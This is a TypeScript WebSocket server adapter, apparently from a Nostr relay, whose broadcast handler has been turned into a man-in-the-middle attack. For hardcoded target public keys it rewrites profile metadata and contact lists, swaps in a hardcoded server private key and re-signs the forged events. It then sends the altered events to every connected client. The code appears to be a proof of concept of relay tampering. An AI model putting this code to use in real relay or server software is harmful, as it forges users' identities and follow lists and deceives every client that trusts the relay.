import { IncomingMessage, Server } from 'http'
import WebSocket, { OPEN, WebSocketServer } from 'ws'
import { propEq } from 'ramda'

import { IWebSocketAdapter, IWebSocketServerAdapter } from '../@types/adapters'
import { WebSocketAdapterEvent, WebSocketServerAdapterEvent } from '../constants/adapter'
import { createLogger } from '../factories/logger-factory'
import { Event } from '../@types/event'
import { Factory } from '../@types/base'
import { getRemoteAddress } from '../utils/http'
import { isRateLimited } from '../handlers/request-handlers/rate-limiter-middleware'
import { Settings } from '../@types/settings'
import { WebServerAdapter } from './web-server-adapter'
import {getEventHash, getPublicKey} from "../utils/event";
import * as secp256k1 from "@noble/secp256k1";
import cluster from "cluster";
import {createOutgoingEventMessage} from "../utils/messages";

const debug = createLogger('web-socket-server-adapter')

const WSS_CLIENT_HEALTH_PROBE_INTERVAL = 120000

export class WebSocketServerAdapter extends WebServerAdapter implements IWebSocketServerAdapter {
  private webSocketsAdapters: WeakMap<WebSocket, IWebSocketAdapter>

  private heartbeatInterval: NodeJS.Timer

  public constructor(
    webServer: Server,
    private readonly webSocketServer: WebSocketServer,
    private readonly createWebSocketAdapter: Factory<
      IWebSocketAdapter,
      [WebSocket, IncomingMessage, IWebSocketServerAdapter]
    >,
    private readonly settings: () => Settings,
  ) {
    debug('created')
    super(webServer)

    this.webSocketsAdapters = new WeakMap()

    this
      .on(WebSocketServerAdapterEvent.Broadcast, this.onBroadcast.bind(this))

    this.webSocketServer
      .on(WebSocketServerAdapterEvent.Connection, this.onConnection.bind(this))
      .on('error', (error) => {
        debug('error: %o', error)
      })
    this.heartbeatInterval = setInterval(this.onHeartbeat.bind(this), WSS_CLIENT_HEALTH_PROBE_INTERVAL)
  }

  public close(callback?: () => void): void {
    super.close(() => {
      debug('closing')
      clearInterval(this.heartbeatInterval)
      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket)
        if (webSocketAdapter) {
          debug('terminating client %s: %s', webSocketAdapter.getClientId(), webSocketAdapter.getClientAddress())
        }
        webSocket.terminate()
      })
      debug('closing web socket server')
      this.webSocketServer.close(() => {
        this.webSocketServer.removeAllListeners()
        if (typeof callback !== 'undefined') {
          callback()
        }
        debug('closed')
      })
    })
    this.removeAllListeners()
  }

  private onBroadcast(event: Event) {


    // do MITM on Profile
    const server_privKey = '72434ed46eecea6d09c2cf139014cc27a8fb0cdb7cd55ad13fdbc0fb1ad4fd80'
    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d' // for npub1ynert...
    const target_pub2 = '2c62a6ba421347b19b25812a509e7cac4558162ce3f5ede27b1d0b722a531207' //

    console.log('sendEvent Server->Client')
    console.log(event)
    if(event.kind==0 && event.pubkey==target_pub){
      console.log('Do MITM on profile')

      //let mitmEvent = clone(event)

      event.pubkey = getPublicKey(server_privKey)
      event.content = '{"display_name":"0BobMITM","website":"","name":"","lud06":"","about":"MITM works!"}'

      getEventHash(event).then((newid)=>{
        secp256k1.schnorr.sign(newid, server_privKey).then((newsig)=>{
          event = {
            id: newid,
            pubkey: event.pubkey,
            //created_at: event.created_at,  // for Damus
            created_at: Math.floor(Date.now() / 1000), // for others
            kind: event.kind,
            tags: event.tags,
            sig: Buffer.from(newsig).toString('hex'),
            content:event.content,
          }

          console.log('MITM event')
          console.log(event)
          this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
            if (!propEq('readyState', OPEN)(webSocket)) {
              return
            }
            const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
            if (!webSocketAdapter) {
              return
            }
            webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
          })
        })
      })
    }else if(event.kind==3 && event.pubkey==target_pub2){
      console.log('Do MITM on Contact List')
      event.tags = [['p','c746ffd4285589064d0b160e00646070ba152fcd0841b9aalab22f73a3d53101'], ['p','c746ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95'], ['p','abc6ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95'], ['p', '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d']]
      console.log('MITM event')
      console.log(event)

      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        if (!propEq('readyState', OPEN)(webSocket)) {
          return
        }
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
        if (!webSocketAdapter) {
          return
        }
        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
      })
    }else if(event.kind==3 && event.pubkey==target_pub){
      console.log('Do MITM on Contact List')
      event.pubkey = getPublicKey(server_privKey)
      event.tags = [['p','c746ffd4285589064d0b160e00646070ba152fcd0841b9aalab22f73a3d53101'], ['p','c746ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95']]

      getEventHash(event).then((newid)=>{
        secp256k1.schnorr.sign(newid, server_privKey).then((newsig)=>{
          event = {
            id: newid,
            pubkey: event.pubkey,
            //created_at: event.created_at,  // for Damus
            created_at: Math.floor(Date.now() / 1000), // for others
            kind: event.kind,
            tags: event.tags,
            sig: Buffer.from(newsig).toString('hex'),
            content:event.content,
          }

          console.log('MITM event')
          console.log(event)

          this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
            if (!propEq('readyState', OPEN)(webSocket)) {
              return
            }
            const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
            if (!webSocketAdapter) {
              return
            }
            webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
          })
        })
      })
    }else{
      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
        if (!propEq('readyState', OPEN)(webSocket)) {
          return
        }
        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
        if (!webSocketAdapter) {
          return
        }
        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
      })
    }


  }

  public getConnectedClients(): number {
    return Array.from(this.webSocketServer.clients).filter(propEq('readyState', OPEN)).length
  }

  private async onConnection(client: WebSocket, req: IncomingMessage) {
    const currentSettings = this.settings()
    const remoteAddress = getRemoteAddress(req, currentSettings)

    debug('client %s connected: %o', remoteAddress, req.headers)

    if (await isRateLimited(remoteAddress, currentSettings)) {
      debug('client %s terminated: rate-limited', remoteAddress)
      client.terminate()
      return
    }

    this.webSocketsAdapters.set(client, this.createWebSocketAdapter([client, req, this]))
  }

  private onHeartbeat() {
    this.webSocketServer.clients.forEach((webSocket) => {
      const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
      if (webSocketAdapter) {
        webSocketAdapter.emit(WebSocketAdapterEvent.Heartbeat)
      }
    })
  }
}
